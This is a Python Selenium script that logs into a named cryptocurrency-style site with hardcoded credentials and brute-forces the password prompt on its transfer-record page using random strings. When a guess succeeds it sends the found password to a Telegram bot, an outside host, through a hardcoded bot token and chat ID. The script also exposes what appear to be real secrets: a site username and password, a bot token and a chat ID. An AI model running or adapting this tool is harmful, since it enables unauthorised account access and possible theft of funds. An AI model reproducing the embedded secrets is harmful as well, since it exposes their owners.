import time
import random
import string
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# ====== LOGIN CREDENTIALS ======
USERNAME = "NOMANE"
PASSWORD = "pd789456"

# ====== TELEGRAM ALERT CONFIG ======
BOT_TOKEN = "7480019882:AAFpRKfsv_TZn2nKIqsFpN1VGCCtNwBjgmo"
CHAT_ID = "5302763233"
# ===================================

def send_telegram_alert(found_password):
    message = f"[+] SUCCESS! Password mil gaya: {found_password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=data)

def generate_password():
    length = random.randint(4, 10)
    characters = string.ascii_letters + string.digits
    return ''.join(random.sample(characters, length))

options = Options()
options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")

driver = webdriver.Chrome(options=options)

# LOGIN
driver.get("https://btc658.com/pages/user/other/userLogin")
time.sleep(2)
driver.find_element(By.NAME, "account").send_keys(USERNAME)
driver.find_element(By.NAME, "password").send_keys(PASSWORD)
driver.find_element(By.CLASS_NAME, "btn").click()
time.sleep(3)

# TRANSFER PAGE
driver.get("https://btc658.com/pages/user/transfer")
time.sleep(3)

# CLICK ON "RECORD" (top-right corner)
driver.execute_script("document.querySelectorAll('.title-bar .text')[1].click()")
time.sleep(3)

# BRUTE-FORCE LOOP
tried_passwords = set()

while True:
    password = generate_password()
    if password in tried_passwords:
        continue
    tried_passwords.add(password)

    try:
        pwd_input = driver.find_element(By.XPATH, '//input[@type="password"]')
        pwd_input.clear()
        pwd_input.send_keys(password)
        driver.find_element(By.XPATH, '//button[contains(text(),"Confirm")]').click()
        time.sleep(2)

        if not driver.find_elements(By.XPATH, '//input[@type="password"]'):
            print(f"[+] SUCCESS! Password mil gaya: {password}")
            send_telegram_alert(password)
            break
        else:
            print(f"[-] Wrong password: {password}")

    except Exception as e:
        print(f"[!] Error: {e}")
    
    time.sleep(2)
